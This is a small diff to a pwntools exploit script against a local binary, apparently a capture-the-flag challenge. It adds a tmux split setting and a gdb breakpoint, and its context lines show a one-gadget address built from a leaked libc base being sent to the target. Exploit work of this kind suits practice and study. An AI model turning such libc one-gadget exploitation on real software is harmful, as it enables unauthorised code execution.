@@ -2,6 +2,8 @@
 
 from pwn import *
 
+context.terminal = ['tmux', 'splitw', '-h']
+
 elf = ELF("./ar8b_ac")
 endpoint = process("./ar8b_ac")
 
@@ -26,6 +28,7 @@ print("[+] One gadget loc: 0x{:2x}".format(libc_base + one_gadget_offset))
 
 if "--gdb" in sys.argv:
     gdb.attach(endpoint, """
+    break *0x4007a6
     continue
     """)
 endpoint.send(p64(libc_base + one_gadget_offset))
